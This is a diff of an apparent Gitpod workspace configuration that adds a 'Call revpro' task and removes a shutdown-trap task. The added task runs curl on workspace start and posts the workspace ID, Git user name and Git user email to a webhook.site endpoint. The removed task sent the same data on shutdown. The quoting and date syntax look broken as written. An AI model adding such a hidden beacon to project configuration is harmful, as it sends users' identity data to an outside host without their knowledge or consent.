@@ -1,18 +1,11 @@
 tasks:
-  - init: >-
+  - name: Example of passing an environment variable to a command
+    command: echo "$DOMAIN"      
+  - name: Call revpro    
+    command: >-
           curl -X POST -H 'Content-type: application/json'
           --data '{"GitpodID":$(GITPOD_WORKSPACE_ID),"GitpodUserName":$(GITPOD_GIT_USER_NAME),"GitpodUserEmail":$(GITPOD_GIT_USER_EMAIL),"time":$(date("Y-m-d H:i:s"))}' https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c
-  - name: Shutdown daemon
-    command: |
-      function shutdown() {
-       curl -X POST -H 'Content-type: application/json'
-          --data '{"GitpodID":$(GITPOD_WORKSPACE_ID),"GitpodUserName":$(GITPOD_GIT_USER_NAME),"GitpodUserEmail":$(GITPOD_GIT_USER_EMAIL),"time":$(date("Y-m-d H:i:s"))}' https://webhook.site/f4722056-8d9c-4303-bde5-c1d257e2b54c
-      }
-
-      trap 'shutdown; exit' SIGTERM;
-      printf '\033[3J\033c\033[3J%s\n' 'Waiting for SIGTERM ...';
-      exec {sfd}<> <(:);
-      until read -t 3600 -u $sfd; do continue; done;  
+       
 ports:
   - port: 35729
     onOpen: ignore          
